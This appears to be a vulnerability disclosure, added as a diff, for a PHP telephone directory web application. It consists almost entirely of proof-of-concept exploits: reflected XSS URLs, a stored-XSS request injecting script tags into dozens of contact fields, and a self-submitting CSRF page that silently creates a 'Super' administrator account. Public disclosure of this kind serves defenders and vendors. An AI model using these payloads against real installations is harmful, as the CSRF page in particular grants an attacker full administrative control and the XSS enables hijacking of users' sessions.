@@ -1,0 +1,103 @@
+# Exploit Title: PHP Telephone Directory - Multiple Vulnerabilities
+# Date: 2016-10-16
+# Exploit Author: larrycompress
+# Contact: larrycompress@gmail.com
+# Type: webapps
+# Platform: PHP
+# Vendor Homepage: http://www.pagereactions.com/product.php?pku=2
+# Software Link: http://www.pagereactions.com/downloads/phptelephonedirectory.zip
+---------------------------------------------------------------------------------
+
+POC as follows :
+
+# 0x00 Reflected XSS
+
+---
+
+1.In public search :
+
+http://192.168.1.112/phptelephonedirectory/index.php?key=<svg/onload=alert(1)>
+
+2.In administration web interface (need normal user login) :
+
+http://192.168.1.112/phptelephonedirectory/administration.php?key=<svg/onload=alert(1)>
+
+# 0x01 Stored XSS
+
+---
+
+1.In administration web directory interface (need normal user login) :
+
+http://192.168.1.112/phptelephonedirectory/administration.php
+?pageaction=newcontact
+&subaction=submit
+&id=1
+&dtDOBDate=0000-00-00
+&pointcode=<script>alert(1)/*
+&contacttitle=*/</script>
+&firstname=<script>alert(2)</script>
+&lastname=<script>alert(3)</script>
+&middlename=<script>alert(4)</script>
+&DOBdateradio=usenew
+&dateday=16
+&datemonthnewedit=10
+&dateyearnewedit=2015
+&employeeID=<script>alert(5)/*
+&otherID=*/</script>
+&phonenumber1=<script>alert(6)</script>
+&internalphonenumber=<script>alert(7)</script>
+&phonenumber2=<script>alert(8)</script>
+&phonenumber3=<script>alert(9)</script>
+&fax=<script>alert(10)</script>
+&mobilecell=<script>alert(11)</script>
+&email=<script>alert(12)</script>
+&alternateemail=<script>alert(13)</script>
+&chat=<script>alert(14)</script>
+&website=<script>alert(15)</script>
+&socialmedia1=<script>alert(16)</script>
+&socialmedia2=<script>alert(17)</script>
+&socialmedia3=<script>alert(18)</script>
+&contactposition=<script>alert(19)</script>
+&company=<script>alert(20)</script>
+&qualifications=<script>alert(21)</script>
+&departmentnewedit=
+&buildingroom=<script>alert(22)</script>
+&address=<script>alert(23)</script>
+&city=<script>alert(24)</script>
+&suburb=<script>alert(25)</script>
+&tdstate=<script>alert(26)</script>
+&zippostcode=<script>alert(27)/*
+&country=*/</script><script>alert(28)</script>
+&description=<script>alert(29)</script>
+&recordstatus=active
+
+2.In administration web department interface (need normal user login) :
+
+http://192.168.1.112/phptelephonedirectory/administration.php?pageaction=newdepartment&subaction=submit&departmentname=</select><svg/onload=alert(1)><select>
+
+# 0x02 CSRF (add Super user)
+
+---
+
+In http://192.168.1.103/csrf.html :
+
+<!DOCTYPE html>
+<html>
+  <body>
+    <form action="http://192.168.1.112/phptelephonedirectory/administration.php" method="POST">
+      <input name="pageaction" value="saveuser" type="hidden" />
+      <input name="subaction" value="submit" type="hidden" />
+      <input name="username" value="larry_csrf" type="hidden" />
+      <input name="password" value="larry_csrf" type="hidden" />
+      <input name="userfullname" value="larry_csrf" type="hidden" />
+      <input name="accesslevel" value="Super" type="hidden" />
+      <input name="userstatus" value="active" type="hidden" />
+      <input name="mysubmit" value="submit" type="submit" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+* Thanks to Besim *
